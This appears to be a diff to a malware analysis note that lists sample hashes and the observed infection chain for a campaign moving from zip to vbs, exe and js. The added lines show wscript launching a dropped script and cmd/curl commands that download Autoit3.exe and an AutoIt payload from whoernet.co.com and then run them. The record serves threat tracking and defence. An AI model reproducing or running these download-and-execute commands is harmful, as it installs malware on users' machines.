@@ -8,10 +8,15 @@
 .zip bf2a69d4728af507440925f462a41bac0529dd70eec76ff8b5988bf510bea8ef
 .vbs 1e8a6d34c0fe5a5ad2fc1d6ff7000bcf8efa0704c397cb6ef021c2692bf17fe6
 
-Round 2
+Round 2 - zip > .exe
 
 .zip 902cba22f379a08607515944d8a3ab4718cdc55cc461f1fdb07890b293cd78a0
 .exe b79b536569c0060a834e4001289a6700692d67df58e644779fababf0df22fc75
+
+Round 3 - zip > js 
+
+.zip a83cf81aa22b1f453a9bfd0c1d29402b07e6efb86414a707d29442209caf6c89
+.js 21cbf06080ae61f95617b3f65f85af5a1390133af6c5c516ac251f9f9cde7fa7
 
 *************************************************
 
@@ -29,6 +34,8 @@ Source:	This information was brought to you by ReversingLabs A1000 Malware Analy
 
 *************************************************
 
+Round 1.
+
 url > zip > vbs
 
 WScript.exe C:\Users\Admin\AppData\Local\Temp\Doc-94.vbs
@@ -41,6 +48,20 @@ curl -o Autoit3.exe http://whoernet.co.com:80
 curl -o dftxsm.au3 http://whoernet.co.com:80/msifvwjscyk 
 
 Autoit3.exe dftxsm.au3
+
+*************************************************
+
+Round 3.
+
+wscript.exe C:\Users\Admin\AppData\Local\Temp\De.js
+
+cmd.exe /c cd /d C:\Users\Admin\AppData\Local\Temp & curl -o Autoit3.exe http://whoernet.co.com:80 & curl -o imkvef.au3 http://whoernet.co.com:80/msikatqayts & Autoit3.exe imkvef.au3
+
+curl -o Autoit3.exe http://whoernet.co.com:80 
+
+curl -o imkvef.au3 http://whoernet.co.com:80/msikatqayts 
+
+Autoit3.exe  imkvef.au3
 
 *************************************************
 
